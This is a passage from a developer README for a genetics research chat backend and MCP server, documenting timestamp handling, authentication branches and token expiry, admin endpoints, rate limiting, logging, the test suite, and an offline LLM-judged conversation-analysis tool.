dropping out of the listing. Only the equality is relaxed: an unstamped row never outranks a
stamped one for the same key, since `MAX` ignores NULLs. `IS` and not a `COALESCE` on both sides:
coalescing is null-safe too, but it collapses the NULL rows onto whichever row holds the sentinel,
and the cost splits by sentinel. Coalescing to `''` or `0` cannot cost a key its usable stamp —
a real stamp outranks both in `MAX`, since `''` sorts below every other string and every integer
below every string — but in a key where *no* row is usably stamped the plural read then takes the
group's highest id, unstamped or not, while the singular one keeps returning the sentinel row, so
the two disagree whenever the unstamped row is the newer.
Coalescing to `CURRENT_TIMESTAMP` is the one that costs both: it equals every row written in the
current second, so the NULL rows collapse onto a usably stamped row and `MAX(id)` can hand the key
to an unstamped one. Timestamps come back from these reads as timezone-aware UTC, because SQLite
stores `CURRENT_TIMESTAMP` as naive UTC and the API serializes them with `.isoformat()`; the saves
and `get_tool_description_history` return aware UTC too, so a `PUT` response and the following
`GET` on one key no longer differ by the process's UTC offset (they still differ in precision —
the save reports `now()` to the microsecond, the read the stored second) and the history head
string-matches the description in force. The `user_comments` accessors now follow
(`genetics-results-suite-ni9`): `get_user_comments` and `list_all_user_comments` parse through
`_as_utc_or_epoch` like the config reads, and `add_user_comment` hands back aware UTC instead of
naive *local*, so a `POST` response and the `GET` of the same row no longer differ by the
process's offset. `list_all_user_comments` is the one that had to stop raising — it backs
`GET /chat/v1/admin/feedback`, so one unusable row 500'd the whole feed. Both halves of that feed
moved together: `chat_history_db.list_sessions_with_comments` returns aware UTC as well, and for
the merge that is the point rather than a tidy-up. The merge key is `(created_at, source, id)`
with `created_at` an `.isoformat()` string, so an aware stamp renders 25 characters against a
naive one's 19; had only one side moved, the shorter string would sort below the longer at every
exact tie and settle it by the suffix instead of by the `(source, id)` tiebreak that is there to
decide it. The key stays total either way, but only with both sides aware does it order ties the way
`genetics-results-suite-qdf` set out. `list_sessions_with_comments` also gained the `id` tiebreak
its `ORDER BY` was missing, so each source's own order is decided before the merge sees it.

### CORS

| Variable | Description | Default |
|----------|-------------|---------|
| `CORS_ORIGINS` | Comma-separated origins allowed to call the chat API from a browser | `http://localhost:3000,http://127.0.0.1:3000` |

The frontend calls the chat API with `withCredentials: true`, and browsers reject a wildcard
`Access-Control-Allow-Origin` on credentialed requests, so origins are listed explicitly
(`settings.cors_origins`, applied in `chat_api.py`). This only matters in dev, where the frontend
runs on its own origin; in prod the frontend and chat API share an origin behind the reverse proxy,
so no cross-origin request is made.

### Authentication (optional)

| Variable | Description |
|----------|-------------|
| `REQUIRE_AUTH` | Require `X-Goog-Authenticated-User-Email` header (`true`/`false`) |
| `MCP_API_KEY` | Comma-separated bearer tokens for MCP server SSE/HTTP transport auth. **Required** for those transports: `main()` exits with an error rather than starting an unauthenticated remote server |
| `MCP_ALLOW_QUERY_TOKEN` | Also accept the token in a `?token=XXX` query parameter (`true`/`false`, default `false`) |
| `API_TOKEN_TTL_DAYS` | Days of inactivity after which a per-user API token expires; every use pushes the deadline out again. `0` disables expiry. Does not apply to `MCP_API_KEY` (default `90`) |
| `GOOGLE_TOKEN_AUDIENCE` | Comma-separated OAuth client ids a Google Identity Token's `aud` must be one of. Unset means the audience is not checked at all. The deployed value is the gcloud CLI's *public* client id, so it buys cross-OAuth-client replay protection only — not identity, and not replay by another service documenting the same gcloud flow (see branch 3 below) |
| `ALLOWED_EMAILS` | Comma-separated email allow-list shared by all JWT bearer paths (Google Identity Token and Keycloak) |
| `ALLOWED_EMAIL_DOMAINS` | Comma-separated email-domain allow-list shared by all JWT bearer paths (default: `finngen.fi`) |
| `OAUTH_ISSUER` | Keycloak realm issuer URL; enables the OAuth resource-server bearer path when set together with `OAUTH_RESOURCE_URL` |
| `OAUTH_RESOURCE_URL` | Expected `aud` claim (this server's canonical URL) for Keycloak access tokens |
| `OAUTH_JWKS_URI` | Override for the JWKS endpoint; defaults to `<OAUTH_ISSUER>/protocol/openid-connect/certs` |

Tokens are supplied as an `Authorization: Bearer XXX` header. A `?token=XXX` query parameter is also accepted, but only when `MCP_ALLOW_QUERY_TOKEN` is set — off by default, because a credential in a URL is captured where request headers are not: the GKE load balancer's request logs (upstream of the auth-gateway's `token=` redaction), browser history, and the `Referer` header of any outbound link. Enable it only for a client that genuinely cannot set the header (e.g. claude.ai). The query parameter is consulted only when no Bearer header is present, so the header always takes precedence, and a request with neither gets 401.

The bearer auth middleware (`_wrap_with_bearer_auth` in `mcp_server.py`) routes each presented token through four branches in order, mirroring the results-api implementation:

1. **`MCP_API_KEY` shared secret** — constant-time compare against each configured value, on the UTF-8 **bytes** of both sides. `hmac.compare_digest` raises `TypeError` when handed a `str` containing non-ASCII, and `api_keys` is non-empty whenever this wrapper is installed, so every non-ASCII bearer reached at least one comparison — and since this is raw ASGI middleware with no exception handler above it, that surfaced as a **500 rather than a 401** (`genetics-results-suite-zyi`; the fourth instance of this bug in the suite, after results-api, chat-backend's `api_tokens.py` and db-api — `auth/core.py` here was converted to bytes by `genetics-results-suite-th2` but this call site was missed). The raw `authorization` header bytes are also decoded inside a `try`: an `Authorization` value that is not valid UTF-8 raised `UnicodeDecodeError` on the same path, and is now treated as an absent credential, i.e. a 401. The `?token=` fallback below carried the same defect a third time — `scope["query_string"].decode()`, unguarded, a `UnicodeDecodeError` straight out of raw ASGI — and is now caught the same way, an undecodable query string finding no token and falling through to the 401 (`genetics-results-suite-tzi`). All three are pinned in `tests/test_mcp_server.py`, which builds the ASGI scope with raw bytes because httpx refuses to encode a non-ASCII header value or query string and would otherwise fail in the client rather than the server. This gate keeps **UTF-8 on both sides** deliberately, unlike `auth/core.py` below, and no starlette is involved: it decodes the raw ASGI header bytes itself, with UTF-8, so re-encoding with UTF-8 reproduces the wire bytes exactly and anything undecodable is already a 401 before the comparison. Note what switching it would and would not do — switching only the encode would raise `UnicodeEncodeError`, i.e. the 500 this whole line exists to prevent, and switching the decode and the encode together would not change *which* tokens are accepted (the expected side is valid UTF-8 by construction), only where an undecodable value is rejected.
2. **Keycloak OAuth access token (JWT)** — only attempted when `OAUTH_ISSUER` and `OAUTH_RESOURCE_URL` are both set (`settings.oauth_enabled`). If the token contains `.` it is verified with PyJWT against Keycloak's JWKS (fetched and cached via a per-URI singleton `jwt.PyJWKClient`): RS256 signature, `iss == OAUTH_ISSUER`, `aud` includes `OAUTH_RESOURCE_URL` (string or list), and `exp` not expired. The email is taken from the `email` claim (falling back to `preferred_username` only when it is itself an email) and checked against the same `ALLOWED_EMAILS` / `ALLOWED_EMAIL_DOMAINS` allow-list. Any failure (wrong iss/aud/signature, expired, or a JWKS network error) is non-fatal and **falls through** to branch 3 rather than 500-ing.
3. **Google Identity Token (JWT)** — if the token contains `.` it is validated via `google.oauth2.id_token.verify_oauth2_token` using a lazily-initialized singleton `google.auth.transport.requests.Request` (for JWKS caching). The payload must have `email_verified == True`; the email must satisfy the same allow-list (otherwise 401/403). Identity is set to the verified email. `verify_oauth2_token` **skips the `aud` claim when no audience is passed**, so `_audience_allowed` additionally requires `aud ∈ GOOGLE_TOKEN_AUDIENCE` — without it a token minted for a different OAuth client would be accepted as long as its email is allow-listed. The check is inert (with a warning logged per token) while `GOOGLE_TOKEN_AUDIENCE` is unset; the deployment sets it to the gcloud CLI's **public** client id, which is what `gcloud auth print-identity-token` issues — for *everyone*, so what the check is worth is **cross-OAuth-client** replay protection and not identity: it rejects a token addressed to a different client id (ADC's `764086051850-…`, a project-owned client), but *not* one the same user handed to another homegrown service that documents this same `gcloud auth print-identity-token` flow, because that token carries the identical `aud`. The email allow-list carries the whole of the authorization. **This branch is deprecated (still supported, and not being switched off without notice): branch 4 is the recommended programmatic credential.** A project-owned audience was considered and rejected — `gcloud auth print-identity-token` on user credentials cannot request a custom audience, so it would 401 every human caller. Full decision record: `genetics-results-suite/docs/project-spec.md`, "Programmatic credentials: why the per-user API key, not the Google id_token".
4. **Per-user API token** — the recommended programmatic credential, and the one users are pointed at. Fall back to validating against the local LLM config DB (SHA-256 hashed) or via the chat-backend `/v1/tokens/validate` endpoint. Users create tokens from the browser's "MCP and API keys" dialog, i.e. the chat API (`POST /chat/v1/tokens`). That endpoint is `Depends(auth_required)`, which needs the internal-secret marker plus an allow-listed oauth2-proxy identity header, so **no bearer token can mint a token** — a headless caller (CI, service account) needs a human to sign in once and create its key, after which the key works headlessly. Unlike a Google id_token this deployment issues it, can revoke it per user, and ages it out on 90-day idleness.

**Token expiry is idle-based, not absolute.** `user_api_tokens.expires_at` is a *rolling* deadline: `validate_api_token` rejects a token once the deadline has passed, and otherwise pushes it forward to `now + API_TOKEN_TTL_DAYS` (default 90; `0` disables expiry) in the same statement that updates `last_used_at`. A token in regular use therefore never expires, while an abandoned or quietly-leaked one stops working on its own. Rows predating the column have `expires_at IS NULL` and are judged on `COALESCE(last_used_at, created_at) + TTL`, so an actively-used legacy token is not killed the first time it is presented. Timestamps are written in SQLite's own `%Y-%m-%d %H:%M:%S` UTC form so the column stays lexicographically sortable alongside `CURRENT_TIMESTAMP` values; `_as_utc` accepts both that and ISO-8601 when reading. Pushing the deadline is bookkeeping, not part of the decision: it is the one write in `LLMConfigDB` whose failure is logged and swallowed rather than raised, so a locked or full database cannot reject a token the SELECT has already accepted. Every other write accessor rolls back and re-raises, and each of them (reads included) discards a transaction found open on the thread's cached connection, so no failure can hold the write lock against the other writers of `llm_config.db`. `chat_history_db.py` now carries the same guard (`genetics-results-suite-4um`): WAL made the trigger rarer there, not impossible, and a failed COMMIT is unaffected by journal mode. The methods that run several DMLs under one commit — `add_message` (message plus the session touch), `fork_session` (the session plus every copied message), `upsert_analysis` (the analysis row plus its issue rows) — put all of their statements inside the one `try`, so a failure partway leaves neither half rather than a session holding a truncated conversation. The discard on entry cannot cost them anything: each runs it once before its own first statement, and no accessor calls another after opening a transaction (`fork_session`'s only nested read runs before its first `INSERT`).

Note that neither the shared `MCP_API_KEY` path nor this per-user path logs anything on success, so **mcp-server logs cannot attribute usage to a user for either** — only the Google-JWT and Keycloak branches emit an `authenticated … user: <email>` line. `user_api_tokens.last_used_at` is the only per-user record of API-token usage — and only when it can be written: the update is swallowed on failure (see above), so under a locked or full database the request is still authenticated and the sole trace is the `could not record use of API token id=…` WARNING, which names the token id but not the user.

In deployment, `ALLOWED_EMAILS` and `ALLOWED_EMAIL_DOMAINS` are sourced from the shared `bearer-auth-allowed` Kubernetes ConfigMap (defined in `genetics-results-suite/k8s/configs/`), which is also consumed by results-api so both services share an identical allow-list.

### Admin page

| Variable | Description | Default |
|----------|-------------|---------|
| `ENABLE_ADMIN_PAGE` | Enable admin page and API endpoints | `false` |
| `ADMIN_USERS` | Comma-separated admin email addresses | `""` |

When `ENABLE_ADMIN_PAGE=true`, admin endpoints are available at `/chat/v1/admin/`. Access control depends on `REQUIRE_AUTH`:
- `REQUIRE_AUTH=false` (dev mode): any user can access admin endpoints
- `REQUIRE_AUTH=true`: only users listed in `ADMIN_USERS` can access admin endpoints

`REQUIRE_AUTH` is read in exactly one place, `settings.require_auth`. `auth.dependencies` used to
snapshot it into a module global at import time while `chat_api.py`'s `/chat/v1/auth` re-read
`os.environ` per request; production never disagreed (nothing in `src/` writes `os.environ` at
runtime), but the two could not be moved together in a test, so the `is_admin` the frontend shows
its admin UI on could contradict the `admin_required` gate on the endpoints behind it
(`genetics-results-suite-pol`). The global is gone rather than aliased, so a test still patching
`auth.dependencies._require_auth` now fails loudly; use `conftest.settings_env(REQUIRE_AUTH=…)`,
which patches the environment and rebuilds the cached `Settings`. Routing the gate through
`Settings` does **not** change which sources are visible: `chat_api.py` calls `load_dotenv()`
before it imports the auth dependencies and is their only importer, so the old global already saw
`.env`. What it changes is that a `Settings` instance cannot exist before `config/settings.py`'s own
module-level `load_dotenv()`, so the ordering hazard is structurally impossible rather than merely
untriggered. In k8s the variable is set in the container env either way.

`INTERNAL_API_SECRET` now goes through the same field, `settings.internal_api_secret`
(`genetics-results-suite-avt`). It had four independent readers — `auth/dependencies.py` and
`routers/api_tokens.py` snapshotted it at import, `tools/executor.py` and `mcp_server.py` read it
live — so the four could disagree. It was fail-closed throughout (an empty secret skips the bearer
branch entirely and falls through to requiring the IAP header, rather than comparing against `""`),
and `tests/test_internal_api_secret.py` now pins both that and the agreement of all four consumers
by setting the environment *after* import, which is exactly what a snapshot cannot see.

**The identity header is not a credential on its own** (`genetics-results-suite-th2`). Anything
that can reach chat-backend on the pod network can set `X-Goog-Authenticated-User-Email` to any
string, so `auth/core.py:get_authenticated_user` honours it only when the request also carries the
trusted-proxy marker, and then holds the address to `ALLOWED_EMAILS`/`ALLOWED_EMAIL_DOMAINS` (which
fails open, with a warning, when a deployment configures neither). `auth/dependencies.py:auth_required`
resolves: marker + allow-listed header → that user; marker + non-allow-listed header → 401, never a
downgrade to `mcp-tool`; marker alone → `mcp-tool`; header alone → 401.

`auth/core.py:is_internal_caller` is the **single** place `INTERNAL_API_SECRET` is compared, and it
accepts the marker in either transport:

- `X-Internal-Auth: <secret>` — auth-gateway's, on the two locations proxying browser traffic here
  (`/chat/v1/` and `= /status`). A dedicated header rather than `Authorization` so that a
  chat-backend still on the previous image ignores it: with the marker on `Authorization`, the old
  code matches the bearer *before* it reads the identity header, and every browser user during the
  gateway-leads-backend rollout window would have resolved to the one `mcp-tool` identity — owning
  their sessions, messages, downloads and API tokens permanently.
- `Authorization: Bearer <secret>` — results-api's and mcp-server's, unchanged. Service-to-service
  callers with no `Authorization` of their own to displace.

Both compare as **bytes**: `hmac.compare_digest` on `str` raises `TypeError` for a non-ASCII value,
and a 500 from a forged header is a worse failure mode than a 401. **The two sides use different
codecs on purpose** (`genetics-results-suite-ctq`): the presented value is re-encoded **latin-1**,
which undoes exactly how starlette decoded the raw header bytes (verified on the pinned starlette
0.50.0) — UTF-8 re-encoded the mojibake instead (`b"s\xc3\xa9cret"` came back out as
`b"s\xc3\x83\xc2\xa9cret"`). `INTERNAL_API_SECRET` stays **UTF-8**. This is *not* justified by
"callers transmit it UTF-8-encoded": measured off a real socket, the clients disagree with each
other — node fetch/undici (the browser BFF) and python-requests put latin-1 on the wire, aiohttp
puts UTF-8, and httpx 0.28, which is this repo's own client, refuses to send a non-ASCII header
value at all (`UnicodeEncodeError` client-side). Byte-exactness across all callers is therefore
unachievable, and under a hypothetical non-ASCII secret this pairing would authenticate the
aiohttp-shaped caller and 401 the BFF-shaped one — the reverse of the old UTF-8/UTF-8 pairing.
What makes the comparison well defined is the **ASCII invariant**, now enforced rather than
assumed: `config.require_internal_api_secret` — the startup check the deployed entrypoints already
call (`genetics-results-suite-618`) — additionally refuses a non-ASCII secret, so the pod fails
readiness and the rollout stalls with the old pods still serving instead of every internal call
401ing at request time. It stays silent for an unset secret in the sense that matters: an unset
secret still gets 618's own message, and the paths that legitimately have none (a local run, the
sandbox image) never call it. Every codec coincides on ASCII, so nothing observable changed.
There is no `try/except UnicodeEncodeError` around the re-encodes as there is in results-api,
because this `is_internal_caller` takes a starlette `Request` and can only see a str starlette
itself latin-1-decoded; the comment there says so. `tests/test_auth_header_trust.py` pins the
ASCII case, the UTF-8-wire case, and — with a hand-built ASGI scope — which raw wire bytes
authenticate under a non-ASCII secret, which TestClient cannot express because
`starlette/testclient.py` re-encodes httpx's decoded header str as UTF-8.
`tests/test_internal_api_secret.py` pins the startup guard. `POST /chat/v1/tokens/validate`
is the only route with no auth dependency; it calls the same helper (it used to repeat the
comparison, on `str`, and drifted) and additionally rejects any request carrying an identity header,
since its genuine callers never assert one.

Admin endpoints:
- `GET /chat/v1/admin/sessions` — list all sessions with filters and pagination. Each session item carries conversation-analysis fields (LEFT JOINed from `conversation_analysis`): `disposition`, `issue_count`, `issue_categories` (list of strings), `llm_rating` (the `llm_quality_score`, 1-5 or null), `success_label`. Filters: `user`, `date_from`, `date_to`, `session_id`, plus analysis filters `disposition` (exact), `success_label` (exact), `min_issues` (keep sessions with `issue_count >= N`), and `rating`. The `rating` param is a **string**: `"1"`..`"5"` filter the exact LLM rating, and the sentinel `"NA"` filters to unrated sessions (no `llm_quality_score`, i.e. unanalyzed sessions or rows with a NULL score). NA is implemented via the `unrated: bool` param on `ChatHistoryDB.list_all_sessions` (`a.llm_quality_score IS NULL`). The paginated `total` reflects all active filters.
- `GET /chat/v1/admin/sessions/{id}` — session detail with all messages
- `GET /chat/v1/admin/analytics/usage?period=week|month|year` — daily usage stats (unique users, conversations)
- `GET /chat/v1/admin/analytics/quality` — raw per-conversation analysis rows for the Quality plots tab (`rows` of `session_id`, `created_at`, `llm_quality_score`, `llm_disposition`, `success_label`, `issue_categories`). Returned unaggregated (ordered by `created_at`); the frontend does the rolling-window aggregation client-side. Sourced from `ChatHistoryDB.list_all_analysis_rows`.
- `GET /chat/v1/admin/feedback` — unified, paginated feed of all user feedback sorted by `created_at` DESC. Merges two sources: standalone feedback from the `user_comments` table (submitted via the Feedback dialog) and per-session comments from `chat_sessions.comment`. Response includes `items` (each with `user`, `comment`, `preview`, `created_at`, `source`, and optional `session_id`), `total` count, `latest_at` timestamp, and pagination parameters (`offset`, `limit`). The merge is ordered by `(created_at, source, id)`, not `created_at` alone: `created_at` is `CURRENT_TIMESTAMP` in both tables and has one-second resolution, so submissions inside one second tie and neither query orders them, and a page is a slice of that order — a boundary inside a tie would show an admin one item twice and hide another. The two sources have separate id spaces (an autoincrement int, a session uuid), which never meet because `source` is compared first

The `/chat/v1/auth` endpoint includes an `is_admin` boolean in its response, used by the frontend to show/hide the admin menu.

### Rate limiting

| Variable | Description | Default |
|----------|-------------|---------|
| `RATE_LIMIT_PER_HOUR` | Max chat messages per user per hour | `20` |
| `RATE_LIMIT_PER_DAY` | Max chat messages per user per day | `100` |

Rate limiting is per user email (from `X-Goog-Authenticated-User-Email` header) and applies to `POST /chat/v1/chat`. Both limits use sliding windows. Returns HTTP 429 with the specific limit hit when exceeded.

### MCP server options

| Variable | Description |
|----------|-------------|
| `LOG_LEVEL` | Logging level: `DEBUG`, `INFO`, `WARNING`, `ERROR` (default `INFO`) |
| `MCP_DISABLE_TRANSPORT_SECURITY` | Allow all hosts/origins (dev only) |
| `EXTERNAL_MCP_SERVERS` | Comma-separated URLs of always-on external MCP servers (gnomAD, Open Targets) |
| `EXTERNAL_MCP_EXCLUDE_TOOLS` | Tool names to exclude from proxying |
| `ENABLE_CREDIBLE_SETS_STATS` | Enable `get_credible_sets_stats` tool (default `false`) |
| `ENABLE_PHENOTYPE_REPORT` | Enable `get_phenotype_report` tool (default `false`) |
| `RAG_MCP_SERVER` | URL of the RAG MCP server (only included when `tool_profile` is `"rag"` or unset) |

These flags feed `settings.disabled_tools` (as does `ENABLE_SUBAGENTS`), which the MCP server, the chat API and the subagents all read, so a disabled tool is invisible on every surface rather than only unregistered on one.

Default external servers:
- gnomAD: `https://gnomad-mcp-dpsnoyqx6q-uc.a.run.app`
- Open Targets: `https://mcp.platform.opentargets.org`

### Subagent options

| Variable | Description | Default |
|----------|-------------|---------|
| `ENABLE_SUBAGENTS` | Enable the `launch_subagents` tool | `false` |
| `SUBAGENT_MODEL` | Model for subagents (falls back to `fast_model`) | `""` |
| `SUBAGENT_TIMEOUT` | Seconds per subagent execution | `120` |
| `SUBAGENT_ALLOWED_PATHS` | Comma-separated directories for file access | `""` |
| `ENABLE_SCRIPT_EXECUTION` | Allow subagents to execute scripts | `false` |
| `SUBAGENT_SCRIPT_TIMEOUT` | Seconds per script execution | `30` |

## Logging

The application uses structured JSON logging for GCP Cloud Logging via `logging_config.py`:

- **GCPJsonFormatter**: Outputs JSON with `timestamp`, `severity`, `logger`, `message`, and optional `exception` fields. On GKE, stdout is automatically captured by fluentbit and sent to Cloud Logging.
- **MCP Server (stdio)**: Uses standard Python logging to stderr (stdout reserved for MCP protocol)
- **MCP Server (SSE/HTTP)** and **Chat API**: Use GCP JSON logging to stdout
- **Log level**: Controlled by `LOG_LEVEL` env var (default `INFO`)
- **Noisy loggers suppressed**: `uvicorn.access`, `httpx`, `httpcore`, `urllib3`, `asyncio` are set to WARNING

**Cost logging**: Every Anthropic API call logs estimated cost based on model pricing and token usage (input, output, cache read, cache creation). A summary line is logged when the chat completes with total tokens and cost. Cost is logged even for secret chats. User email is included in all log lines. Subagent API calls also track token usage: `SubagentResult` includes `input_tokens` and `output_tokens` accumulated across all iterations, and an aggregated cost log line is emitted after `launch_subagents` completes.

Log levels:
- **INFO**: Server startup, tool registration, external server connections, API call cost
- **WARNING**: Fallback scenarios (e.g., Tavily→DuckDuckGo)
- **ERROR**: API failures, tool execution errors (with tracebacks)
- **DEBUG**: HTTP call details, SSE parsing

## Testing

Tests are in `tests/` using pytest with pytest-asyncio:

| Test file | Coverage |
|-----------|----------|
| `test_mcp_server.py` | MCP server initialization and tool registration |
| `test_chat_api.py` | FastAPI endpoints (status, tools, chat) |
| `test_tools.py` | Tool executor methods |
| `test_executor_resilience.py` | Upstream-unreachable handling in `_ResilientAsyncClient` |
| `test_db.py` | Database operations, LLM-config write transaction safety, LLM-config journal mode (WAL, and the reader/writer concurrency it buys), same-second tiebreak in the tool-description, user-setting and user-comment accessors (`changed_at`/`created_at` have one-second resolution, so the later `id` wins; both row orders, blank timestamps, several keys tied at once), and malformed-stamp reads (a NULL or unparseable `changed_at` degrades to the epoch in the singular and plural accessors alike rather than raising or dropping the key, and a group holding both a NULL and a sentinel stamp, `''` or `0` — the one shape that separates the `IS` join from a coalescing one — resolves to the same row in both, and the comment and tool-history reads degrade the same way), chat-history write transaction safety (every write accessor over a failed DML and a failed commit, the retained lock, and the multi-DML writes rolled back whole), and the zone the write path returns (the saves, the version history and `add_user_comment` hand back aware UTC, as the reads do) |
| `test_chat_history_router.py` | Chat history API |
| `test_llm_config_router.py` | LLM config API |
| `test_llm_config_db_migration.py` | One-shot import of legacy per-user instructions into instruction sets |
| `test_instruction_sets_db.py` | Instruction-set accessors: per-user scoping, write-time caps (including a concurrent-create race), over-cap rows reported not truncated, history, archiving, ordering, timestamp degradation, transaction safety (rollback on failure or on a failed commit, update racing an archive, update's read-modify-write under the write lock, reads never returning uncommitted rows) |
| `test_llm_service.py` | Replayed-history helpers: `tool_use`/`tool_result` pairing, marker stripping, cache breakpoint, truncation item counting |
| `test_phewas_categories.py` | PheWAS category mappings |
| `test_subagent.py` | Subagent service, skills, sandbox tools |
| `test_variant_analysis.py` | Variant list analysis tool |
| `test_downloads.py` | Download store, TSV conversion, download endpoint, and the regression guard for silent download failures: every malformed `_download_data` payload (including verbatim reproductions of the `bef` and `buc` positional-rows payloads, and a non-`str` `filename`) must raise `DownloadShapeError` out of `_convert_to_tsv`, must never return quietly from `_process_download_hints`, and must there yield `DOWNLOAD_SHAPE_NOTE` plus a `DOWNLOAD_SHAPE_DEFECT tool=…` ERROR line with a traceback *without* propagating; a `TypeError` from the store still propagates (pinning the narrow `except`); `ENOSPC`, an unwritable storage path and an unencodable upstream value each surface `DOWNLOAD_FAILED_NOTE` plus a `DOWNLOAD_FAILED tool=…` ERROR line |
| `test_bigquery_gene_tools.py` | BigQuery-backed gene tools: the two result shapes (`results` named as dicts for the model, `_download_data` positional and actually round-tripped through `_convert_to_tsv` to prove the TSV has a header row), empty results, loud failure on a `columns`/row-arity mismatch, and the injection defence on the five methods that build SQL themselves (injected gene/resource/window rejected before the query is issued, legitimate symbols quoted, `limit` honoured by both the statement and the row cap) |
| `test_sql_safety.py` | Allow-list SQL literal validation: real gene/resource ids accepted, quote/backslash/semicolon/newline/NUL payloads rejected, numeric coercion and range checks |
| `test_sdk.py` | Genetics SDK: argument-shape dispatch for every collapsed function (gene vs variant vs region vs phenotype), refusal of ambiguous or empty shapes and of arguments the selected branch cannot honour, region parsing, DataFrame return contract (positional db-api rows named from `columns`, empty results keeping their schema), `GeneticsError` on failure and on truncation, `limit` defaulting to the row ceiling, the row cap being lifted only on executors the client builds, `configure()` refusing to redirect the authenticated client, phenotype/dataset/gene-symbol lookups, the sync facade, and a subprocess check that importing the SDK pulls in no chat-backend module |
| `test_gene_group_tools.py` | Gene group membership and symbol normalization |
| `test_literature_search.py` | Literature backend selection, Perplexity metadata hydration |
| `test_myvariant.py` | myvariant.info annotation tool |
| `test_uniprot.py` | UniProt client: resolution tiers, TTL cache, variant effect |
| `test_temperature.py` | Temperature off by default, model-specific rejection (`model_rejects_temperature()`) |
| `test_analyze_conversations.py` | Conversation analysis: parsing, categorization, metrics, eval export |
| `test_conversation_analysis_db.py` | Conversation analysis cache tables, upsert idempotency, staleness selection |
| `test_analysis_timeseries.py` | Rolling-window series aggregation |
| `test_admin_router.py` | Admin router endpoints, auth guards, DB methods |
| `test_cost.py` | Cost estimation and context window lookup |
| `test_replay_benchmark.py` | Replay harness: SSE/usage parsing, paired ordering, matched-pair analysis, tool_result replay, percentiles, error handling (runs a local stub SSE server) |

Run tests:
```bash
pytest
pytest --cov=src/genetics_mcp_server  # with coverage
```

`pytest-randomly` (pinned to 4.1.0 in the `dev` extra) shuffles test order on every run, so
order-dependent state leaking between tests fails visibly instead of hiding behind the
collection order. The seed is printed in the pytest header; reproduce a failure with
`pytest --randomly-seed=<seed>`, or take the collection order out of the picture with
`pytest -p no:randomly`. The pin is deliberate — the seed-to-order mapping is not stable
across plugin versions, so a seed quoted in a bug report only means something at one version.

## Conversation Analysis

`scripts/analyze_conversations.py` is an offline tool that reads the chat-history
SQLite DB, persists per-conversation analysis results back into that DB (the
`conversation_analysis` / `conversation_issue` tables), and produces a markdown
report (`report.md`) plus an eval dataset. With `--output-dir` it also writes a
local-dev `metrics.json` (consumed by `plot_conversation_scores.py` for
quality-over-time plots).

- **Eval export** (`export_eval_dataset()` → `eval_dataset.json`) picks representative
  conversations per topic and, besides the display transcript (`turns`, capped at 2,000
  chars per message), emits `user_turns`: every user turn of the session in order, with
  untruncated content and the options in force at that turn (`verbosity`, `tool_profile`,
  `instruction_set_id`, `literature_backend`). This is what makes a multi-turn replay
  possible — `first_user_message` alone only reproduces the opening. **Each row's own
  values are the options in force at that row, nulls included**: the browser sends all
  four keys on every `saveMessage` and `add_message` stores exactly what the request
  carried, so a null is a recorded choice rather than a gap — `tool_profile IS NULL`
  specifically means "all tools" (`build_anthropic_tools` applies no category filter
  when it is `None`). Carrying the last non-null value forward would export a user who
  switched back to all-tools as still running the previous profile. The one exception
  is a row on which **all four** columns are null, which cannot have been written by
  the current client and so predates the wiring; there the previous turn's settings
  carry forward. Message order uses `message_sort_keys()` — `(created_at, rowid)`,
  because `created_at` has one-second resolution and a user turn routinely shares a
  second with its reply. All previously exported keys are retained.
- **Models** (env-overridable): both topic classification (`$ANALYZE_TOPIC_MODEL`)
  and the quality judge (`$ANALYZE_QUALITY_MODEL`) default to Opus 5.
  CLI flags `--topic-model` / `--quality-model` override the env defaults.
- **Thinking is off** on every analysis call (`thinking_off_kwargs()`): the output is
  a JSON object, so reasoning tokens only add cost and latency. Opus 5 thinks by
  default, so opting out has to be explicit — and Fable/Mythos reject the opt-out,
  hence the model check. Responses are read with `response_text()`, which
  concatenates the `text` blocks instead of indexing `content[0]` — a thinking-capable
  model leads with a `ThinkingBlock` that has no `.text`, which is what broke the
  nightly job when it moved to Opus 5.
- **LLM-as-judge** evaluates each conversation. The judge is given today's date and
  is told it cannot see raw tool output, so it must not flag real (precise, recent)
  data as fabricated. Attachments (stored only in a message's `content_json`) are
  surfaced to the judge so file-based questions aren't mistaken for fabrication.
- **Disposition** classifies each conversation's outcome: `good_answer`,
  `agent_failure`, `technical_failure`, `out_of_scope`, `unfinished`,
  `weird_or_unclear`. Only `good_answer`/`agent_failure` count toward the
  **agent-quality** metric (successful/neutral/unsuccessful). `technical_failure`
  keeps a low score but buckets separately (infra ≠ agent); out-of-scope / unfinished
  / weird requests are not penalized. This keeps the quality trend measuring only
  conversations the agent could have done well at. Conversations the judge skipped
  (no quality score) and with no user rating are labelled `unknown` rather than given
  a heuristic label, so they stay out of the quality metric.
- **Tool-call counting** comes from the `tool_use` blocks in `chat_messages.content_json`,
  which is the real record of what the model called. The `*[Using tool: X]*` markers in
  `content` are display prose — injected for the UI and stripped from replayed history by
  `_strip_tool_use_markers` — so they are only a fallback, used for rows that carry no
  block list at all (history predating the `content_json` migration).
  `parse_tool_calls_from_content_json()` returns `None` for such rows and `[]` for a row
  that was recorded and called nothing, which is what keeps the fallback in
  `message_tool_calls()` targeted instead of silently preferring one source. Malformed
  or non-list `content_json` degrades to `None` rather than raising: the column is
  client-supplied and one bad row must not fail a run over thousands.
- **Counting coverage is reported alongside every tool aggregate.** `build_tool_coverage()`
  returns a per-session provenance frame plus a `ToolCountCoverage` summary (assistant
  messages and tool calls per source, sessions fully covered by `content_json`). A session
  with even one marker-counted assistant message gets
  `ConversationMetrics.tool_count_is_lower_bound`, the report prints a **Counting coverage**
  block under Tool Usage Patterns, and every tool aggregate carries an explicit
  lower-bound caveat when any session is not fully covered; per-session counts render as
  `>=N` wherever the session's flag is set. This exists so a tool-count aggregate is never
  quoted — or benchmarked against — as if it were a total. Note that full coverage is not
  the same as completeness: the browser also persists partial `content_json` when a stream
  is interrupted (`LLMChat`'s `partialMsg` path), so a present block list may be truncated
  at the point the stream died while still counting as fully covered. An empty frame is
  reported as "no assistant messages" rather than exact.
- **Issue categorization**: the judge's detailed per-conversation issues are mapped
  onto a fixed taxonomy (`conversation_prompts.py:ISSUE_CATEGORIES`) via a separate
  cheap pass (batched, on the topic model) so the report surfaces recurring problems
  instead of count-1 unique strings.
- **Caching**: per-session topic + quality + derived results are persisted to the
  `conversation_analysis` / `conversation_issue` SQLite tables (with the full
  `ConversationMetrics` blob in `metrics_json`) and read back via `get_analysis_map`
  so already-analyzed sessions skip the LLM. A session is treated as cached only if
  its row's `analyzer_version` equals the module-level `ANALYZER_VERSION` (bumping
  that constant invalidates every cached analysis). `source_updated_at` is stored as
